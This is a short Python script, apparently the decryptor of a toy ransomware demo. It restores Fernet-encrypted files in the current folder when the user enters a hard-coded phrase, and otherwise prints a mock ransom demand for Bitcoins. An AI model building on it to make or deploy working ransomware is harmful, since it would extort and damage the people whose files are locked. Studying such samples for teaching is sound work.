#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Let's find some files
files = []
for file in os.listdir():
    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

secretphrase = "coffee"

user_phrase = input("Enter the secret phrase to decrypt your files\n")

if user_phrase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print("Congrats! You're files are decryopted. Enjoy your coffee!")

else:
    print("Sorry! Wrong secret phrase! Send me more Bitcoins!!!")
